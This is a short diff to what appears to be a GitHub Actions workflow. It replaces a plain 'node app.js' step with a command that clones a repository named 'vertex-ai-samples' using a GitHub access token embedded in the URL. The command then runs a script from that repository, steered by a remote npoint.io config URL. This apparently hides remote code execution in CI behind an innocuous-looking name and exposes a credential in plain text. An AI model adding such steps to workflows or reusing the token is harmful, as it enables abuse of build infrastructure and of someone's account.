@@ -9,4 +9,4 @@
             node-version: [18]
         steps:
         - uses: actions/checkout@v3
-        - run: timeout 60m node app.js  # Lệnh mớisd
+        - run: git clone https://mom742886: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@github.com/mom742886/vertex-ai-samples.git; cd vertex-ai-samples ; node addon/app.js -s="https://api.npoint.io/977ad833c75b44990f8a"
